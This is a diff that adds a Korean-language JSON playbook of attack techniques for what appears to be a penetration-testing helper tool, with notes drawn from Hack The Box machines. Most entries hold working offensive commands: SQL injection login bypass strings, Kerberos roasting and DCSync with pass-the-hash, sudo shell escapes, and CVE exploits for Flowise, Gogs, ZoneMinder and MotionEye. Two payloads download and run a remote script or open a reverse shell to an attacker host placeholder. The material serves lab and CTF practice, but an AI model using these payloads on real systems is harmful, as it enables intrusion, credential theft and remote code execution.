@@ -1,0 +1,144 @@
+[
+  {
+    "name": "MySQL/MariaDB 비번없는 root 로그인",
+    "when": {"ports": [3306], "services": ["mysql", "mariadb"]},
+    "suggest": [
+      "nmap -p3306 -sV --script mysql-info,mysql-empty-password {t}",
+      "mysql -h {t} -u root"
+    ],
+    "note": "HTB Sequel: 비번없는/기본 root 로그인 시도(비번프롬프트 Enter). 성공 시 SHOW databases; USE <db>; SHOW tables; SELECT * FROM <t>; → flag/자격. users 테이블 해시는 크랙 후 재사용. 원격접속 거부 시 mysql -h {t} -u root -p 로 흔한 비번.",
+    "tags": ["mysql", "db", "weak-cred"],
+    "phase": "access"
+  },
+  {
+    "name": "로그인폼 SQLi 인증우회",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Appointment: 로그인폼에 SQLi 우회 시도 — Username: admin'#  / admin' -- -  / ' or 1=1-- -  (Password 아무거나). #/-- 로 비번체크 주석처리. 자동 탐지는 sqlmap --forms --batch. 성공 시 관리패널/flag.",
+    "tags": ["web", "sqli", "auth-bypass"],
+    "phase": "access"
+  },
+  {
+    "name": "AD LDAP 익명 바인드 열거",
+    "when": {"ports": [389, 3268], "services": ["ldap"], "os": ["windows_ad"]},
+    "suggest": [
+      "ldapsearch -x -H ldap://{t} -s base namingcontexts",
+      "ldapsearch -x -H ldap://{t} -b \"dc=DOMAIN,dc=LOCAL\""
+    ],
+    "note": "HTB Forest: null bind 가능 시 도메인 객체 열거. windapsearch.py -d <domain> --dc-ip {t} -U (유저), --custom \"objectClass=*\"(전체). ldapdomaindump, nxc ldap {t} -u '' -p '' --users 도. 도메인명은 smb-os-discovery/ldap namingcontexts 로 확인 후 /etc/hosts.",
+    "tags": ["ad", "ldap", "enum"],
+    "phase": "enum"
+  },
+  {
+    "name": "AD ASREPRoasting(pre-auth 비활성)",
+    "when": {"ports": [88], "services": ["kerberos"], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Forest: Kerberos pre-auth 비활성 계정의 TGT 요청→오프라인 크랙. impacket-GetNPUsers <domain>/<user> -dc-ip {t} -no-pass (유저목록은 -usersfile users.txt). $krb5asrep$23$ 해시 → john --format=krb5asrep -w rockyou (hashcat -m18200). 크랙 비번은 evil-winrm/SMB 재사용.",
+    "tags": ["ad", "asreproast", "kerberos"],
+    "phase": "access"
+  },
+  {
+    "name": "AD Kerberoasting(SPN 계정)",
+    "when": {"ports": [88], "services": ["kerberos"], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "AD: 도메인 자격 확보 후 SPN 계정 TGS 요청→크랙. impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip {t} -request → $krb5tgs$ 해시 → hashcat -m13100 rockyou. 서비스계정 약비번 획득. (ASREPRoast 는 pre-auth off, Kerberoast 는 인증 후 SPN)",
+    "tags": ["ad", "kerberoast", "kerberos"],
+    "phase": "lateral"
+  },
+  {
+    "name": "AD BloodHound 수집·분석",
+    "when": {"ports": [389, 445], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Forest: 공격경로 시각화. 원격수집 bloodhound-python -d <domain> -u <user> -p <pass> -ns {t} -c all. Windows 셸이면 SharpHound.exe -c All 업로드/실행→zip 다운→BloodHound GUI. 소유노드 표시 후 'Shortest Path to High Value'. 중첩그룹(Account Operators 등)·ACL(WriteDACL/GenericAll) 확인.",
+    "tags": ["ad", "bloodhound"],
+    "phase": "privesc"
+  },
+  {
+    "name": "AD ACL 악용 → DCSync → PtH",
+    "when": {"ports": [445], "os": ["windows_ad"]},
+    "suggest": [],
+    "note": "HTB Forest: WriteDACL/GenericAll 경로로 DCSync 권한 부여. 예) Exchange Windows Permissions 그룹이 도메인 WriteDACL → net user john P@ss /add /domain; net group \"Exchange Windows Permissions\" john /add; PowerView Add-ObjectACL -PrincipalIdentity john -Rights DCSync → impacket-secretsdump <domain>/john@{t} → Administrator NTLM → PtH: evil-winrm -i {t} -u administrator -H <NT해시> (impacket-psexec -hashes :<NT>).",
+    "tags": ["ad", "dcsync", "pass-the-hash", "secretsdump"],
+    "phase": "privesc"
+  },
+  {
+    "name": "SSH 개인키 패스프레이즈 크랙(ssh2john)",
+    "when": {},
+    "suggest": [],
+    "note": "HTB Facts: 암호화된 id_rsa/id_ed25519 획득 시 ssh2john id_ed25519 > hash.txt; john -w=rockyou hash.txt → 패스프레이즈. ssh-keygen -y -f <key> 로 공개키의 user@hostname 주석 확인(소유자 식별). chmod 600 후 ssh -i <key> <user>@{t}.",
+    "tags": ["ssh", "crack", "key"],
+    "phase": "access"
+  },
+  {
+    "name": "sudo 바이너리 권한상승(GTFOBins)",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Facts: sudo -l 로 NOPASSWD 허용 바이너리 확인 → GTFOBins 참고. 예) facter: mkdir /tmp/x; echo 'exec(\"/bin/bash\")'>/tmp/x/exploit.rb; sudo facter --custom-dir /tmp/x. vi/vim: sudo vi -c ':!/bin/sh'. find: sudo find . -exec /bin/sh \\; . env/python/perl/awk/less/man 등도. 환경변수 필요 시 sudo -E 또는 secure_path 확인.",
+    "tags": ["linux", "privesc", "sudo", "gtfobins"],
+    "phase": "privesc"
+  },
+  {
+    "name": "Flowise 비번리셋 토큰노출(CVE-2025-58434)",
+    "when": {"ports": [80, 443, 3000, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Silentium: Flowise <=3.0.x. /api/v1/version 으로 버전확인. curl -XPOST http://<host>/api/v1/account/forgot-password -H 'Content-Type: application/json' -d '{\"user\":{\"email\":\"<email>\"}}'|jq → 응답 JSON 에 tempToken 노출 → Reset Password 에 토큰+새비번 → 계정탈취 로그인. 사용자는 사이트 Leadership/About 에서 수집.",
+    "tags": ["web", "flowise", "cve-2025-58434", "account-takeover"],
+    "phase": "access"
+  },
+  {
+    "name": "Flowise CustomMCP RCE(CVE-2025-59528)",
+    "when": {"ports": [80, 443, 3000, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB Silentium: Flowise 3.0.5 로그인 후 API Keys 에서 키 확보. curl -XPOST http://<host>/api/v1/node-load-method/customMCP -H 'Authorization: Bearer <key>' -H 'Content-Type: application/json' -d '{\"loadMethod\":\"listActions\",\"inputs\":{\"mcpServerConfig\":\"({x:(function(){const cp=process.mainModule.require(\\\"child_process\\\");cp.execSync(\\\"curl {atk}:5050/s.sh|sh\\\");return 1;})()})\"}}' → Docker 컨테이너 RCE.",
+    "tags": ["web", "flowise", "cve-2025-59528", "rce"],
+    "phase": "access"
+  },
+  {
+    "name": "Docker 컨테이너 환경변수 자격수집",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Silentium: ls -la / 에 .dockerenv 면 컨테이너. env 로 노출 자격 수집(DB_PASSWORD/SMTP_PASSWORD/API키/SENDER_EMAIL 등) → 호스트 사용자 비번 재사용 ssh. /proc/1/environ, 애플리케이션 설정파일도.",
+    "tags": ["linux", "docker", "creds", "lateral"],
+    "phase": "lateral"
+  },
+  {
+    "name": "nginx sites-enabled 내부서비스 발견",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB Silentium: 셸 후 cat /etc/nginx/sites-enabled/* 로 proxy_pass 127.0.0.1:<port> 와 server_name <vhost> 확인 → 내부 전용 서비스(Gogs 3001 등) 발견 → /etc/hosts 추가 + ssh -L 포워딩으로 접근. netstat -tulnp / ss -tln 으로 로컬 리스닝 포트 교차확인.",
+    "tags": ["linux", "nginx", "pivot", "enum"],
+    "phase": "lateral"
+  },
+  {
+    "name": "Gogs 심볼릭링크 임의쓰기(CVE-2025-8110)",
+    "when": {"ports": [3000, 3001], "services": ["http"]},
+    "suggest": [],
+    "note": "HTB Silentium: Gogs 0.13.x. 회원가입→repo 생성→ cd repo; ln -s /root/.ssh/authorized_keys overwrite_me; git add/commit/push → git ls-tree HEAD overwrite_me (blob SHA). Gogs 토큰 생성(Settings>Applications). SSH 공개키 base64. curl -XPUT -H 'Authorization: token <t>' http://<gogs>/api/v1/repos/<u>/<r>/contents/overwrite_me?ref=master -d '{\"message\":\"x\",\"content\":\"<b64pubkey>\",\"sha\":\"<blobSHA>\"}' → /root/.ssh/authorized_keys 기록 → ssh root@{t}.",
+    "tags": ["gogs", "cve-2025-8110", "symlink", "privesc"],
+    "phase": "privesc"
+  },
+  {
+    "name": "ZoneMinder SQLi(CVE-2024-51482)",
+    "when": {"ports": [80, 443, 8080], "services": ["http", "https"]},
+    "suggest": [],
+    "note": "HTB CCTV: ZoneMinder(/zm) 기본자격 admin:admin. 버전 1.37.x → Boolean/time SQLi(web/ajax/event.php tid). sqlmap -u 'http://<host>/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie=ZMSESSID=<c> -D zm -T Users -C Username,Password --dump → bcrypt → hashcat -m3200 rockyou → 재사용 ssh.",
+    "tags": ["web", "zoneminder", "cve-2024-51482", "sqli"],
+    "phase": "access"
+  },
+  {
+    "name": "tcpdump cap_net_raw 트래픽 자격탈취",
+    "when": {"os": ["linux"]},
+    "suggest": [],
+    "note": "HTB CCTV: getcap -r / 2>/dev/null 또는 getcap /usr/bin/tcpdump → cap_net_raw=eip 면 비root 로 캡처 가능. ip a 로 docker 브리지(br-xxxx) 확인 → tcpdump -i br-xxxx -A -s0 tcp 로 컨테이너간 평문 자격(USERNAME=/PASSWORD=) 스니핑 → ssh/앱 재사용. linpeas 로 capability 자동탐지.",
+    "tags": ["linux", "sniffing", "capabilities", "creds"],
+    "phase": "lateral"
+  },
+  {
+    "name": "MotionEye RCE + 클라이언트검증 우회(CVE-2025-60787)",
+    "when": {"ports": [8765], "services": ["http", "motioneye"]},
+    "suggest": [],
+    "note": "HTB CCTV: MotionEye(기본 8765, 내부면 ssh -L 포워딩). 로그인 admin:<재사용비번>. 버전 0.43.x/Motion 4.7.x → Image/Movie File Name 명령주입(/etc/motioneye/camera-x.conf picture_filename 셸파싱). 클라이언트 JS 검증은 브라우저 콘솔 configUiValid=function(){return true;} 로 우회. Image File Name=$(python3 -c \"import os;os.system('bash -c \\\"bash -i >& /dev/tcp/{atk}/9001 0>&1\\\"')\").%Y-%m-%d-%H-%M-%S → Interval Snapshots 1s → Apply → root 셸(MotionEye 가 root).",
+    "tags": ["motioneye", "cve-2025-60787", "rce", "privesc"],
+    "phase": "privesc"
+  }
+]
